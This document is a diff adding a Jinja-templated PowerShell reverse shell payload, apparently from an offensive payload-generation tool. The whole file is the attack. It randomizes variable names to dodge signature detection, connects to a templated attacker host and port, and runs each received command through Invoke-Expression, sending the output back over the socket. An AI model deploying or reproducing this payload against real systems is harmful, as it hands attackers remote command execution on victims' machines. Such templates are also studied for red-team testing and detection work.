@@ -1,0 +1,33 @@
+{% set variables = strings_random(10, 10) %}
+
+${{ variables[0] }} = "[38;5;196m>-[0m [38;5;250m${Env:PWD}[0m"
+${{ variables[1] }} = "[38;5;196m->[0m"
+${{ variables[2] }} = New-Object System.Net.Sockets.TCPClient(
+    "{{ lhost }}", {{ lport }})
+${{ variables[3] }} = ${{ variables[2] }}.GetStream()
+[byte[]] ${{ variables[4] }} = 0..65535 | ForEach-Object { 0 }
+
+${{ variables[3] }}.Write(
+    ([text.encoding]::ASCII).GetBytes((
+        "{0} {1} " -f ${{ variables[0] }}, ${{ variables[1] }})))
+${{ variables[3] }}.Flush()
+
+while ((${{ variables[5] }} = ${{ variables[3] }}.Read(
+        ${{ variables[4] }}, 0, ${{ variables[4] }}.Length)) -ne 0) {
+    ${{ variables[6] }} = (New-Object -TypeName System.Text.ASCIIEncoding).
+        GetString(${{ variables[4] }}, 0, ${{ variables[5] }})
+    & { Invoke-Expression ${{ variables[6] }} } 2>&1 |
+        Tee-Object -Variable {{ variables[7] }} | Out-Null
+    ${{ variables[8] }} = "{0}`n{1} {2} " -f
+        (${{ variables[7] }} | Out-String),
+        ${{ variables[0] }},
+        ${{ variables[1] }}
+    ${{ variables[9] }} = ([text.encoding]::ASCII).
+        GetBytes(${{ variables[8] }})
+    ${{ variables[3] }}.
+        Write(${{ variables[9] }}, 0, ${{ variables[9] }}.Length)
+    ${{ variables[3] }}.Flush()
+};
+
+${{ variables[2] }}.Close()
+
